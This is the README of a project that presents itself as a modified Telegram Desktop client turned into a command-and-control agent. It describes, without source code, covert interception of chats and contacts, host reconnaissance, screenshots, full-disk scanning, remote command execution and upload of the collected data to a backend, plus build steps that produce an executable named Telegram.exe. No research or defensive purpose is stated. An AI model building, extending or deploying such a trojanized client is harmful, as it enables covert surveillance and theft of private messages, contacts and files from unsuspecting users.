# Telegram C2 客户端 (Client)

本项目基于 Telegram Desktop 官方源码修改，集成了数据采集、系统侦察和远程控制功能 (C2 Agent)。

## 1. 功能特性

### A. 数据收集 (本地 DB)
- **消息拦截**: 捕获聊天消息（文本和图片），保存到本地加密 SQLite 数据库 `tdata_client.db`。
- **联系人提取**: 捕获 Telegram ID, 用户名, 电话号码等。

### B. 系统侦察
- **基本信息**: 自动上报 MAC 地址、IP 地址、主机名、OS 版本。
- **屏幕截图**: 支持实时截图 (`get_screenshot`) 和定时监控 (`start_monitor`)。
- **文件系统扫描**: 全盘扫描文件并计算 MD5，生成 `scan_results.db` 上传。
- **软件枚举**: 读取注册表获取已安装软件列表。
- **WiFi 扫描**: 调用 `netsh` 获取周边 WiFi 信息。

### C. 数据外泄与控制
- **心跳机制**: 每 60 秒（默认）发送心跳包到后端，维持在线状态。
- **任务轮询**: 接收并执行远程命令 (`cmd_exec`, `upload_file`, `upload_db` 等)。
- **数据同步**: 启动时自动收集并上传 `tdata_client.db`。

## 2. 构建与运行

### 环境要求
- Windows 10/11 SDK
- Visual Studio 2022 (C++ 桌面开发工作负载)
- Python 3.x (用于构建脚本)

### 构建步骤
1. 运行构建脚本:
   ```cmd
   compile_client.bat
   ```
   该脚本会自动配置 CMake 并调用 Ninja/MSBuild 进行编译。

### 运行
生成的可执行文件位于 `out/Release/Telegram.exe`。
建议使用单独的工作目录运行以避免污染数据：
```cmd
Telegram.exe -workdir tdata
```

## 3. 架构说明
- **核心类**: `Core::Heartbeat` (单例)，负责与 C2 后端通信。
- **数据库**: 使用 SQLite (`tdata_client.db`) 存储拦截的数据。
- **通信协议**: HTTP POST，数据通过 JSON 传输，支持文件 Multipart 上传。
